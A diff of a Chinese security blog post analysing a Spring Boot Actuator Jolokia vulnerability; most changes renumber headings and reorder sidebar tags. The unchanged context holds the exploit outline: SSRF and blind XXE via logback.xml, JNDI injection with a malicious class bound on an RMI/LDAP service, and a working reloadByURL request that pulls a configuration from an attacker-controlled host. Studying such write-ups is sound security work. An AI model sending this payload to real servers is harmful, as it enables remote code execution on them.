@@ -502,7 +502,7 @@ height:50vh;
 <p>没有任何防护。也就是说这里是可以引入外部资源，同时解析xml文档的，那么这里起码就有一个ssrf，和一个没有回显的xxe。那么看一下这个所谓的JMX配置文件也就是<code>logback.xml</code>有没有什么可以搞的东西。在<code>logbacks.xml</code>中有这么一个标签：</p>
 <p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522930494363.jpg" alt=""></p>
 <p>这里把<code>env-entry-name</code>改为自己的服务器地址就能在目标机上执行任意代码。</p>
-<h1 id="0x06-poc构造"><a href="#0x06-poc构造" class="headerlink" title="0x06 poc构造"></a>0x06 poc构造</h1><p>漏洞分析的话上面的一个章节已经说得非常清楚了，下面我们来探讨以下如何利用这个漏洞，如果想要利用该漏洞的话需要准备以下几个必备条件：</p>
+<h1 id="0x05-poc构造"><a href="#0x05-poc构造" class="headerlink" title="0x05 poc构造"></a>0x05 poc构造</h1><p>漏洞分析的话上面的一个章节已经说得非常清楚了，下面我们来探讨以下如何利用这个漏洞，如果想要利用该漏洞的话需要准备以下几个必备条件：</p>
 <ol>
 <li>一个N/D服务（RMI或者LDAP皆可）</li>
 <li>绑定在N/D服务上的恶意类</li>
@@ -515,7 +515,7 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:9998!/logback.xml</span><br></pre></td></tr></table></figure>
 <p>效果如下：</p>
 <p><img src="http://image-lucifaer.test.upcdn.net/2019/03/11/15522997474196.jpg" alt=""></p>
-<h1 id="0x07-Reference"><a href="#0x07-Reference" class="headerlink" title="0x07 Reference"></a>0x07 Reference</h1><ul>
+<h1 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h1><ul>
 <li><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></li>
 <li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></li>
 <li><a href="https://logback.qos.ch/manual/configuration.html#insertFromJNDI" target="_blank" rel="noopener">https://logback.qos.ch/manual/configuration.html#insertFromJNDI</a></li>
@@ -675,7 +675,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-什么是Spring-Boot-Actuator"><span class="toc-number">1.</span> <span class="toc-text">0x01 什么是Spring Boot Actuator</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Jolokia端点的大致运行流程"><span class="toc-number">2.</span> <span class="toc-text">0x02 Jolokia端点的大致运行流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-构造请求路由"><span class="toc-number">3.</span> <span class="toc-text">0x03 构造请求路由</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-寻找可以利用的点"><span class="toc-number">4.</span> <span class="toc-text">0x04 寻找可以利用的点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-poc构造"><span class="toc-number">5.</span> <span class="toc-text">0x06 poc构造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-Reference"><span class="toc-number">6.</span> <span class="toc-text">0x07 Reference</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-什么是Spring-Boot-Actuator"><span class="toc-number">1.</span> <span class="toc-text">0x01 什么是Spring Boot Actuator</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Jolokia端点的大致运行流程"><span class="toc-number">2.</span> <span class="toc-text">0x02 Jolokia端点的大致运行流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-构造请求路由"><span class="toc-number">3.</span> <span class="toc-text">0x03 构造请求路由</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-寻找可以利用的点"><span class="toc-number">4.</span> <span class="toc-text">0x04 寻找可以利用的点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-poc构造"><span class="toc-number">5.</span> <span class="toc-text">0x05 poc构造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-Reference"><span class="toc-number">6.</span> <span class="toc-text">0x06 Reference</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -688,20 +688,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1314,10 +1300,6 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
     
-        <span class="sidebar-tag-name" data-tags="Spring"><span class="iconfont-archer">&#xe606;</span>Spring</span>
-    
-        <span class="sidebar-tag-name" data-tags="jolokia"><span class="iconfont-archer">&#xe606;</span>jolokia</span>
-    
         <span class="sidebar-tag-name" data-tags="Nexuss"><span class="iconfont-archer">&#xe606;</span>Nexuss</span>
     
         <span class="sidebar-tag-name" data-tags="Struts2"><span class="iconfont-archer">&#xe606;</span>Struts2</span>
@@ -1332,9 +1314,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="薅羊毛"><span class="iconfont-archer">&#xe606;</span>薅羊毛</span>
     
-        <span class="sidebar-tag-name" data-tags="BlackHat SEO"><span class="iconfont-archer">&#xe606;</span>BlackHat SEO</span>
+        <span class="sidebar-tag-name" data-tags="Spring"><span class="iconfont-archer">&#xe606;</span>Spring</span>
+    
+        <span class="sidebar-tag-name" data-tags="jolokia"><span class="iconfont-archer">&#xe606;</span>jolokia</span>
     
         <span class="sidebar-tag-name" data-tags="RichFaces"><span class="iconfont-archer">&#xe606;</span>RichFaces</span>
+    
+        <span class="sidebar-tag-name" data-tags="BlackHat SEO"><span class="iconfont-archer">&#xe606;</span>BlackHat SEO</span>
     
         <span class="sidebar-tag-name" data-tags="安全研究"><span class="iconfont-archer">&#xe606;</span>安全研究</span>
     
